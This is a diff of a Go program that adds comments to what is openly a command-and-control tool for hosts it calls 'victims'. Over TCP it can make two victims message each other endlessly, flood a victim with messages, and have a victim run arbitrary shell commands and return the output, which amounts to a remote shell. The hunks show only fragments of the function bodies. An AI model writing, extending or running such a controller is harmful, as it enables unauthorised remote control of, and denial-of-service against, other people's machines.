@@ -14,16 +14,37 @@ const (
 	connType = "tcp"
 )
 
+/*
+* Makes the victim send "PING" to another victim, who will reply back with "PONG"
+* The two victims will constantly message each other back
+*
+* conn: A net.Conn to the victim
+*
+* victim: A string of the IP address of the other victim
+ */
 func pingpong(conn net.Conn, victim string) {
 	fmt.Fprintf(conn, "PONG "+victim+"\n")
 }
 
+/*
+* Sends a choosen number of PONG messages to the victim. The victim replies back with PING, but the controller does not print it
+*
+* conn: A net.Conn to the victim
+* count: How many times the "PONG" message should be sent
+ */
 func flood(conn net.Conn, count int) {
 	for i := 0; i < count; i++ {
 		fmt.Fprintf(conn, "PONG\n")
 	}
 	fmt.Fprintf(conn, "exit\n")
 }
+
+/*
+* Has the victim run shell commands with exec.Command().
+* The victim will then send the output back. The exit command will exit this function
+*
+* conn: A net.Conn to the victim
+ */
 func control(conn net.Conn) {
 	var input string
 	for {
@@ -53,6 +74,9 @@ func control(conn net.Conn) {
 	return
 }
 
+/*
+* Handles input and command selection. Also handles connected to the victim
+ */
 func main() {
 
 	var input string
